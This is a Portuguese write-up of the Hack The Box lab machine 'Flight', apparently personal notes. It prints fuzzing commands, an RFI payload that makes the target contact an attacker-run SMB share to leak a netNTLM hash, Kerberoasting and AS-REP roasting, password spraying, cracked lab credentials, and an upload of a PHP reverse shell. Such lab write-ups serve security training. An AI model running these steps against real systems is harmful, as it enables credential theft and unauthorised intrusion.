# Flight

## Enumeration

Nmap script

![qownnotes-media-VMuwah](../../.gitbook/assets/qownnotes-media-VMuwah.png)

![qownnotes-media-eKewwb](../../.gitbook/assets/qownnotes-media-eKewwb.png)

UDP scan

![qownnotes-media-VMgxgZ](../../../media/qownnotes-media-VMgxgZ.png)

Full TCP scan

![image](../../.gitbook/assets/image%20(1).png)

Então temos:

DNS HTTP Kerberos RPC SMB LDAP

### HTTP

![qownnotes-media-zNgBXB](../../media/qownnotes-media-zNgBXB.png)

![qownnotes-media-TwGaZc](../../media/qownnotes-media-TwGaZc.png)

![qownnotes-media-VveKHl](../../media/qownnotes-media-VveKHl.png)

![qownnotes-media-qQXkSz](../../media/qownnotes-media-qQXkSz.png) =======> Possible entry point

Dando sequência após a enumeração dos demais. Nada encontrado exceto por este subdomínio:

```
school.flight.htb
```

### SMB

![qownnotes-media-bkzCgk](../../media/qownnotes-media-bkzCgk.png)

```
g0.flight.htb
```

![qownnotes-media-DQoVIc](../../media/qownnotes-media-DQoVIc.png)

### RPC

![qownnotes-media-kBtyxd](../../media/qownnotes-media-kBtyxd.png)

### LDAP

![qownnotes-media-LnGbjN](../../media/qownnotes-media-LnGbjN.png)

### Kerberos

```
kerbrute userenum --domain flight.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.187
```

![qownnotes-media-RAnyke](../../media/qownnotes-media-RAnyke.png)

### DNS

![qownnotes-media-OxlPjV](../../media/qownnotes-media-OxlPjV.png)

![qownnotes-media-nyDtLD](../../media/qownnotes-media-nyDtLD.png)

![qownnotes-media-OyCEfo](../../media/qownnotes-media-OyCEfo.png)

### HTTP continue

```
school.flight.htb
```

![qownnotes-media-iUmICa](../../media/qownnotes-media-iUmICa.png)

![qownnotes-media-kMffXk](../../media/qownnotes-media-kMffXk.png)

Aqui eu notei que o que muda é o parâmetro "view" da URL, então eu tentei esse mesmo teste, mas de maneira diferente:

```
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://school.flight.htb?view=FUZZ -e ".php,.html" -fs 1102
```

![qownnotes-media-XXURur](../../media/qownnotes-media-XXURur.png)

![qownnotes-media-puTALa](../../media/qownnotes-media-puTALa.png)

As que vieram diferentes foram:

![qownnotes-media-KrRjij](../../media/qownnotes-media-KrRjij.png)

```
g0.flight.htb
```

![qownnotes-media-CDlMtu](../../media/qownnotes-media-CDlMtu.png)

Deu em nada aqui

No entanto, se formos parar para perceber, me parece que isso pode estar sendo consultado no banco de dados... Vamos para um outro teste :

#### SQLi

```
ffuf -c -ic -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -u http://school.flight.htb?view=FUZZ -e ".php,.html" -fs 7069,1170,1102
```

![qownnotes-media-NHAXrq](../../media/qownnotes-media-NHAXrq.png)

![qownnotes-media-RlSMVb](../../media/qownnotes-media-RlSMVb.png)

![qownnotes-media-SdlWrO](../../media/qownnotes-media-SdlWrO.png)

![qownnotes-media-HtZCrq](../../media/qownnotes-media-HtZCrq.png)

#### LFI

PWNED!

![qownnotes-media-GeVlbb](../../media/qownnotes-media-GeVlbb.png)

## Exploitation

Para conseguir explorar essa vulnerabilidade, testei algumas coisas, no entanto, imaginei que fosse algum arquivo que eu deveria extrair e , na verdade se tratava de um RFI e, sendo assim, seria possível obter o hash de senha por meio do seguinte payload:

```
impacket-smbserver -smb2support smb .

http://school.flight.htb/index.php?view=//10.10.14.14/smb/test.txt
```

Dessa forma eu forço o sistema a me enviar o hash netNTLM da máquina e eu posso extraí-lo para quebrá-lo e dar sequência no ataque:

![qownnotes-media-hMblhO](../../media/qownnotes-media-hMblhO.png)

![qownnotes-media-JCOaeL](../../media/qownnotes-media-JCOaeL.png)

Tentativa com Kerberoasting

```
impacket-GetUserSPNs 'flight.htb/svc_apache:S@Ss!K@*t13' -dc-ip 10.10.11.187 -request
```

As Rep Roasting:

```
impacket-GetNPUsers -dc-ip 10.10.11.187 flight.htb/ -usersfile users.txt -format john -outputfile hashes

enum4linux -u svc_apache -p 'S@Ss!K@*t13' 10.10.11.187
 
```

Comecei a entrar em vários diretórios, mas de novo sem saber exatamente o que procurar no SMB, exceto pelo Groups.xml Enumerei pelo bloodhound:

```
 bloodhound-python -u svc_apache -p 'S@Ss!K@*t13' -d flight.htb -v --zip -c All -dc g0.flight.htb -ns 10.10.11.187
 
```

Sem sucesso. Password Spray:

```
crackmapexec ldap 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue

crackmapexec winrm 10.10.11.187 -u users.txt -p passwords.txt --continue

crackmapexec winrm 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue
```

![qownnotes-media-ZJWfVt](../../media/qownnotes-media-ZJWfVt.png)

Continuando a enumeração:

```
crackmapexec smb 10.10.11.187 -u 's.moon' -p 'S@Ss!K@*t13' --shares
```

![qownnotes-media-Swipnb](../../media/qownnotes-media-Swipnb.png)

Nesse momento, é interessante considerar a possibilidade de explorar o serviço via SMB, dado que temos autorização de escrita em um dos compartilhamentos listados. Temos alguns vetores para este caso,sendo eles documentados [aqui](../../3\_Exploitation/SMB.md)

Utilizando um desktop.ini com o exemplo obtido na referência acima, conseguimos a credencial do c.bum

c.bum:Tikkycoll\_431012284

Que tem acesso de escrita em uma pasta compartilhada também chamada Web:

```
crackmapexec smb 10.10.11.187 -u c.bum -p 'Tikkycoll_431012284' --shares
```

Depois disso, basta subir uma shell reversa em PHP para conseguir execução de comandos na máquina:

```
smbclient -U flight.htb/c.bum //10.10.11.187/Web -c "put revshell.php"
```
